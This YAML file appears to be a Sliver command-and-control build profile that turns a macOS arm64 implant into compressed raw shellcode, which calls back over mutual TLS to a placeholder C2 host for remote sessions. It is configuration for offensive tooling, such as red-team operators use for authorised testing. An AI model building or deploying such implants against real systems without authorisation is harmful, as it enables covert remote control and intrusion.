---
apiVersion: sliver.bishopfox.com/v1alpha1
kind: BuildProfile
metadata:
  name: darwin-shellcode
  revision: 1
target:
  os: darwin
  arch: arm64
mode: session
c2:
  endpoints:
  - protocol: mtls
    address: mtls://c2.example.invalid:8888
  connectionStrategy: random
  reconnectSeconds: 60
  pollTimeoutSeconds: 360
  maxConnectionErrors: 1000
  httpC2Profile: default
core:
  name: builtin/sliver
  version: 1.0.0
  digest: sha256:91dec1eb4394dbc34ab9e0594d7297424cff0d5523e6ab3b3f6d4ba4f90a1af0
coreOutput:
  kind: shared-library
  container: macho
  goBuildMode: c-shared
coreOptions:
- name: exports
  value:
  - StartW
transforms:
- spec:
    name: builtin/beignet
    version: 1.0.0
    digest: sha256:0e07ef6cfc047b6b87760a1fcf316f8fc5ffc8d8613e7c613917f10ced4bf971
  options:
  - name: compress
    value: true
finalOutput:
  format: shellcode
  artifact:
    kind: shellcode
    container: raw
provider:
  policy: automatic
